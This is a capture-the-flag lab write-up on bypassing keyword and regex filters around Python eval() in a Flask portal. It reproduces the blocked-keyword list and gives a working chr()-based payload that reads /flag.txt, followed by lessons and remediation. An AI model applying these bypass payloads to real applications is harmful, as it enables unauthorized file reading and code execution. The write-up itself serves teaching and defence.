---
vulnerability: RCE
platform: picoCTF
difficulty: Medium
date: 2025-12-13
---
# # Lab: Python Flask Eval Injection with Character Filter Bypass

## Lab Description

A university's online registration portal has a backend component that uses Python's eval() function unsafely. The developer attempted to secure it by implementing keyword filters and regex patterns to block malicious input, but these protections were insufficient. By bypassing the character and keyword filters, attackers can achieve Remote Code Execution (RCE) and read sensitive files like /flag.txt.

## Key Steps

1. **Source Code Analysis**: Identified vulnerable eval() function with planned but incomplete security filters
2. **Keyword Filter Discovery**: Found blocked keywords: `os, eval, exec, bind, connect, python, socket, ls, cat, shell, bind`
3. **Regex Filter Analysis**: Discovered regex pattern: `r'0x[0-9A-Fa-f]+|\\u[0-9A-Fa-f]{4}|%[0-9A-Fa-f]{2}|\.[A-Za-z0-9]{1,3}\b|[\\\/]|\.\.'` designed to block:
    
    - Hex encoded strings (0x...)
        
    - Unicode escapes (\uXXXX)
        
    - URL encoded characters (%XX)
        
    - File extensions
        
    - Slashes and directory traversal
        
4. **Initial Bypass Testing**: Used `str.__add__('o', 's')` to confirm string construction bypass
5. **Quote Bypass**: Used `chr()` function to create strings without quotes
6. **Final Payload Construction**: Built file path and executed file read operation

## Filter Bypass Technique

**Double Bypass Method**:
1. **Keyword Bypass**: Used string concatenation via `str.__add__()` to construct blocked keywords
    - Example: `str.__add__('o', 's')` instead of `'os'`
2. **Quote Bypass**: Used `chr()` with ASCII codes to create strings without quotes
    - Example: `chr(47) + chr(102) + chr(108)` instead of `'/fl'`
3. **Command Bypass**: Used Python's built-in `open().read()` instead of system commands to avoid blocked keywords like `cat`

## Exploitation Payload

`open(chr(47) + chr(102) + chr(108) + chr(97) + chr(103) + chr(46) + chr(116) + chr(120) + chr(116)).read()`

## Payload Breakdown
- `chr(47)` = `/`
- `chr(102)` = `f`
- `chr(108)` = `l`
- `chr(97)` = `a`
- `chr(103)` = `g`
- `chr(46)` = `.`
- `chr(116)` = `t`
- `chr(120)` = `x`
- `chr(116)` = `t`

**Concatenated**: Creates string `"/flag.txt"`
- `open(...).read()`: Reads the file content without using blocked system commands

## Lesson Learned

1. **Blacklisting is insufficient**: Attempting to block specific keywords and patterns always has bypasses
2. **Character encoding bypass**: Filters blocking quotes can be bypassed using ASCII codes via `chr()`
3. **String construction alternatives**: Multiple ways exist to create strings in Python without using quotes
4. **Context matters**: Blocking `cat` doesn't prevent file reading when attackers can use Python's native file operations
5. **Defense in depth needed**: Single-layer filtering is easily bypassed by determined attackers

## Remediation

1. **Avoid eval() completely**: Use safe alternatives like `ast.literal_eval()` for simple expressions
2. **If eval() is absolutely necessary**:
    - Use a strict allowlist of permitted characters/operations
    - Execute in a sandboxed environment with limited permissions
    - Implement timeout mechanisms
3. **Input validation**:
    - Validate at multiple levels (syntax, semantics, context)
    - Use positive security models (allowlist) rather than negative (blocklist)
4. **Output encoding**: Properly encode any output from eval() before displaying
5. **Code review**: Regularly audit code for dangerous functions like `eval()`, `exec()`, `system()`

# Real-World Impact:

This vulnerability demonstrates how seemingly secure filters can be bypassed with creative payload construction. In real-world applications, such vulnerabilities could allow attackers to:

- Read sensitive files (config files, credentials, source code)
- Execute arbitrary system commands
- Establish reverse shells for persistent access
- Pivot to internal network systems
- Perform data exfiltration or system destruction

The bypass technique shown (using `chr()` to avoid quotes) is particularly dangerous as it defeats many common security filters that focus on blocking specific characters rather than understanding the semantic context of the input.